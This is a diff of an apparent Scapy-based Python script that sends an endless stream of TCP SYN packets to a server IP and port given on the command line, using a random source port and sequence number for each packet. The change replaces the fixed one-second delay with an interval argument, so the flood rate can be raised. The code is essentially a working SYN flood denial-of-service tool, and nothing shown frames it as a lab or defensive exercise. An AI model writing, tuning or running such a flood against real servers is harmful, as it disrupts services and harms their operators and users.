@@ -6,13 +6,14 @@ from ipaddress import IPv4Address
 from random import getrandbits
 import time
 
-if len(sys.argv) != 3:
-  print("Usage: sys.argv[0] <IP of server> <port of server>")
+if len(sys.argv) != 4:
+  print("Usage: sys.argv[0] <server IP> <server port> <interval(ms)>")
   exit();
 
 # program has all the 4 params
 server_ip = sys.argv[1]
 server_port = sys.argv[2]
+interval = float(sys.argv[3])
 
 ip = IP(dst=server_ip)
 tcp = TCP(dport=int(server_port), flags='S')
@@ -23,6 +24,6 @@ while True:
   pkt[TCP].sport = getrandbits(16)
   pkt[TCP].seq = getrandbits(32)
   send(pkt, verbose = 0)
-  time.sleep(1)
+  time.sleep(interval)
 
   
